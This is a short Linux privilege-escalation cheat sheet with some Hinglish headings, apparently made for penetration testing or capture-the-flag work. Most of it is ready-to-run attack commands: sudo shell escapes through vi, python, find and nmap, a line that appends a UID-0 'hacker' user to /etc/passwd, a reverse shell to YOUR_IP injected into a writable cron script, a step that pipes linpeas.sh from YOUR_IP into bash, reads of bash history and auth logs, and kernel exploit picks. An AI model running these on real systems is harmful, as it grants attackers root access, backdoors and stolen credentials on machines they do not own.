# ⬆️ LINUX PRIVILEGE ESCALATION CHECKLIST

---

## CHECK 1: sudo -l (PEHLE YEH KARO)
```bash
sudo -l
```
| sudo Output | Exploit |
|---|---|
| `(ALL) NOPASSWD: ALL` | `sudo su` → root |
| `NOPASSWD: /usr/bin/vi` | `sudo vi -c ':!bash'` |
| `NOPASSWD: /usr/bin/python` | `sudo python -c 'import os;os.system("/bin/bash")'` |
| `NOPASSWD: /usr/bin/find` | `sudo find / -exec /bin/bash \;` |
| `NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN{system("/bin/bash")}'` |
| `NOPASSWD: /usr/bin/less` | `sudo less /etc/passwd` → `!bash` |
| `NOPASSWD: /usr/bin/nmap` | `sudo nmap --interactive` → `!sh` |
| `NOPASSWD: /usr/bin/perl` | `sudo perl -e 'exec "/bin/bash";'` |
> Full list: **gtfobins.github.io**

## CHECK 2: SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```
> Same GTFOBins lookup for SUID binaries

## CHECK 3: Writable /etc/passwd
```bash
ls -la /etc/passwd
# Writable? Add root user:
echo 'hacker:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker    # password: pass123
```

## CHECK 4: Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
# Writable cron script? → inject:
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/cron_script.sh
```

## CHECK 5: NFS no_root_squash
```bash
cat /etc/exports
# "no_root_squash" → exploit from attacker machine
```

## CHECK 6: Kernel Exploit
```bash
uname -r && cat /etc/issue
searchsploit linux kernel <version>
```
| Kernel | Exploit |
|---|---|
| < 3.9 | DirtyCow (CVE-2016-5195) |
| < 5.8 | PwnKit (CVE-2021-4034) |

## CHECK 7: Sensitive Files
```bash
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" 2>/dev/null
cat /home/*/.bash_history
cat /var/log/auth.log
find / -writable -type f 2>/dev/null | grep -v proc
```

## CHECK 8: LinPEAS (All-in-One)
```bash
curl http://YOUR_IP:8888/linpeas.sh | bash
```
